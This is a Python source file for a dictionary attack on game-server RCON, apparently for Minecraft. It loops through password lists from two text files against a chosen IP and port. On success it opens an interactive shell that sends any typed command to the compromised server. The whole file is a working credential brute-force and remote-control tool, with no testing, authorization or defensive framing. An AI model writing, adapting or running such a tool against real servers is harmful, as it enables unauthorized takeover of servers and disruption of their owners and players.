import time
import colorama
from colorama import init, Fore
import mcrcon

init()

# .txt base
password_files = ['base.txt', 'base2.txt']

ip = input(Fore.RED + "Enter IP: ")
port = input(Fore.RED + "Enter Rcon Port: ")

rcon_port = int(port)

for password_file in password_files:
    # Download password_files
    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()

    for rcon_password in passwords:
        try:
            with mcrcon.MCRcon(ip, rcon_password, rcon_port) as mcr:
                print(f"[INFO] Connected to {ip} with password: {rcon_password}")
                while True:
                    console = input("")
                    resp = mcr.command(console)
                    print(resp)
                    time.sleep(1)
        except mcrcon.MCRconException as e:
            print(f"[INFO] Incorrect password: {rcon_password}. Trying the next one.")

# if all files have been tried
print("[INFO] All password files have been tried.")
